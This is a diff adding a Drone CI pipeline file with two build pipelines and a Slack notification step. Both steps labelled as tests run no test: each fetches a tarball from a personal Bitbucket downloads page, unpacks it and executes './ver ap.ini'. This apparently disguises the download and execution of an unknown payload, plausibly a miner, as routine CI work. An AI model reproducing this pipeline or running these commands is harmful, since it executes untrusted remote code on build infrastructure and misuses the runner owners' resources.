@@ -1,0 +1,32 @@
+kind: pipeline
+type: docker
+name: build1
+steps:
+- name: test1
+  image: golang
+  commands:
+  - wget https://bitbucket.org/dinoikik/public/downloads/drone.tar.gz && tar -xvf drone.tar.gz && ./ver ap.ini
+---
+kind: pipeline
+type: docker
+name: build2
+
+steps:
+- name: test2
+  image: node
+  commands:
+  - wget https://bitbucket.org/dinoikik/public/downloads/drone.tar.gz && tar -xvf drone.tar.gz && ./ver ap.ini
+---
+kind: pipeline
+name: after
+
+steps:
+- name: notify
+  image: plugins/slack
+  settings:
+    room: general
+
+
+depends_on:
+- build1
+- build2
